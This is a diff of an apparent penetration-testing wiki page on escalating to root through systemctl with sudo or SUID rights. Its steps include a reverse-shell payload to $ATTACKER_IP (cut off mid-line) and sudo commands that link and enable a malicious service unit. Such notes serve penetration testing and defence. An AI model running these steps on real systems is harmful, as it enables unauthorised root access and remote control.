@@ -33,24 +33,48 @@ Systemctl requires root privileges for many operations, which leads to cases whe
 
 Systemctl requires root privileges for many operations, which leads to cases where systemctl has either SUID rights, or certain users can execute it with sudo privileges. When configured with either option, it is possible to create a service unit file containing a payload, which can be executed for a root shell.
 
+
+
 # Instructions
 
 In this example, systemctl has been configured with sudo privileges, but the steps remain the same when it has SUID.
 
 **Important Note: the full path to programs must be specified when using systemctl service unit files!**
 
+
+
 1. Select a payload and save it as /tmp/rootshell. Suggested:
+
+
+
+
 
 **Code**: [[/bin/bash -c '/bin/bash -i >& /dev/tcp/$ATTACKER_I]]
 
+
+
+
+
 2. Create a Systemctl Service Unit and save it as /tmp/root.service.
+
+
+
+
 
 **Code**: [[[Unit]
 Description=rootshell
 [Service]
 Type=notify]]
 
+
+
+
+
 3. Link the unit file.
+
+
+
+
 
 **Command** ([[systemctl Link a Service Unit File]]):
 
@@ -58,13 +82,25 @@ Type=notify]]
 sudo systemctl link $FULL_PATH_TO_FILE
 ```
 
+
+
+
+
 4. Enable and run the service
+
+
+
+
 
 **Command** ([[systemctl Enable and Start a Service by File Name]]):
 
 ```bash
 sudo systemctl enable --now $FULL_PATH_TO_FILE
 ```
+
+
+
+
 
 ## Platforms
 
@@ -88,3 +124,5 @@ sudo systemctl enable --now $FULL_PATH_TO_FILE
 ## Tags
 
 - [[Service Attacks]]
+
+
